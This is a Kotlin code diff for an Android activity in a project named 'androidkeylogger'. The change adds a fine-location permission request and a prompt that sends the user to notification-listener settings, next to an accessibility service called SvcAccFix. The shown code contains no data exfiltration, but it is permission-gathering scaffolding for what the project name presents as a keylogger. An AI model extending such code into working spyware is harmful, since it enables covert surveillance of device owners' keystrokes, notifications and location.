@@ -1,16 +1,20 @@
 package com.azamovhudstc.androidkeylogger.activity
 
+import android.Manifest
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.os.Bundle
+import android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS
 import android.view.View
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
 import com.azamovhudstc.androidkeylogger.R
 import com.azamovhudstc.androidkeylogger.service.SvcAccFix
 
 
 class AccessibilityFixActivity : AppCompatActivity() {
-    private val REQUEST_CODE_NOTIFICATION_LISTENER = 102
+    private val REQUEST_CODE_NOTIFICATION_LISTENER = 10
     private  fun openSetting(view: View) {
         try {
             SvcAccFix.j = true
@@ -38,6 +42,10 @@ class AccessibilityFixActivity : AppCompatActivity() {
         }
         setContentView(R.layout.activity_accessibility)
         checkNotificationListenerPermission()
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.ACCESS_FINE_LOCATION), 1)
+        } else {
+        }
         findViewById<View>(R.id.btn501925).setOnClickListener { view ->
             openSetting(
                 view
@@ -48,8 +56,6 @@ class AccessibilityFixActivity : AppCompatActivity() {
         if (!isNotificationListenerEnabled()) {
             requestNotificationListenerPermission()
         } else {
-            // The user has granted notification access, you can proceed with your app logic here
-            // For example, start your main activity or perform other operations
         }
     }
 
@@ -60,8 +66,10 @@ class AccessibilityFixActivity : AppCompatActivity() {
     }
 
     private fun requestNotificationListenerPermission() {
-        val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
-        startActivityForResult(intent, REQUEST_CODE_NOTIFICATION_LISTENER)
+        val enableNotificationListenerIntent = Intent(ACTION_NOTIFICATION_LISTENER_SETTINGS)
+        enableNotificationListenerIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+        startActivity(enableNotificationListenerIntent)
+        Toast.makeText(this, "Please enable Notification Listener permission", Toast.LENGTH_LONG).show()
     }
 
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
@@ -70,11 +78,18 @@ class AccessibilityFixActivity : AppCompatActivity() {
         if (requestCode == REQUEST_CODE_NOTIFICATION_LISTENER) {
             // Handle result of the notification listener settings activity
             if (isNotificationListenerEnabled()) {
-                // The user has granted notification access, you can proceed with your app logic here
-                // For example, start your main activity or perform other operations
             } else {
-                // The user did not grant notification access, handle it accordingly
-                // For example, display a message to the user or exit the application gracefully
+            }
+        }
+    }
+
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == 1) {
+            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+            } else {
+                // Handle permission denied case
+                Toast.makeText(this, "Location permission denied", Toast.LENGTH_SHORT).show()
             }
         }
     }
